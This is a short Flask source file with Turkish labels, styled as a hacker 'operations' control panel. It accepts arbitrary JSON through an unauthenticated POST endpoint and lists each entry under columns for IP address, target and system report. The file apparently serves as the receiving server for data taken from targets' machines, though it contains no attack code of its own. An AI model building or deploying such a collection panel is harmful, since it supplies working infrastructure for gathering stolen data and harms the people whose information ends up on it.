from flask import Flask, render_template_string, request, jsonify
from datetime import datetime

app = Flask(__name__)

# Kenzz Kaneki System - Siber Veri Havuzu
data_store = []

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KENZZ KANEKI | OPERATIONS</title>
    <link href="https://fonts.googleapis.com/css2?family=Courier+Prime:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            /* Arka planı simsiyahlıktan kurtarıp dolgulu siber mavi yapıyoruz */
            background: radial-gradient(circle, #001220 0%, #000a12 100%);
            background-attachment: fixed;
            color: #bc13fe; 
            font-family: 'Courier Prime', monospace;
            margin: 0;
            padding: 20px;
        }
        h1 {
            color: #00f2ff;
            text-shadow: 0 0 20px #00f2ff;
            text-align: center;
            letter-spacing: 5px;
            margin-bottom: 30px;
            text-transform: uppercase;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid #00f2ff;
        }
        th {
            background-color: #bc13fe;
            color: white;
            padding: 15px;
            text-align: left;
            text-transform: uppercase;
            font-size: 0.8rem;
            border: 1px solid #00f2ff;
        }
        td {
            padding: 12px;
            border: 1px solid rgba(0, 242, 255, 0.2);
            font-size: 0.9rem;
            word-break: break-all;
        }
        tr:nth-child(even) {
            background: rgba(188, 19, 254, 0.05);
        }
        .prefix {
            color: #00f2ff;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <h1>KENZZ KANEKI OPERATIONS</h1>
    <table>
        <thead>
            <tr>
                <th>IP ADRESİ</th>
                <th>HEDEF</th>
                <th>SİSTEM RAPORU</th>
                <th>ZAMAN</th>
            </tr>
        </thead>
        <tbody>
            {% if data %}
                {% for item in data %}
                    <tr>
                        <td class="prefix">{{ item.get('ip', 'Bilinmiyor') }}</td>
                        <td>{{ item.get('user', 'Hedef_Yok') }}</td>
                        <td style="color: #bc13fe;">{{ item.get('full_report', item) }}</td>
                        <td style="color: #00f2ff;">{{ datetime.now().strftime('%H:%M:%S') }}</td>
                    </tr>
                {% endfor %}
            {% else %}
                <tr>
                    <td colspan="4" style="text-align:center; color:#00f2ff;">[!] SISTEM AKTIF - VERI AKISI BEKLENIYOR...</td>
                </tr>
            {% endif %}
        </tbody>
    </table>
</body>
</html>
'''

@app.route('/kenzz-kontrol')
def control_panel():
    return render_template_string(HTML_TEMPLATE, data=data_store, datetime=datetime)

@app.route('/api/data', methods=['POST'])
def receive_data():
    content = request.json
    if content:
        data_store.append(content)
        return jsonify({"status": "success"}), 200
    return jsonify({"status": "error"}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
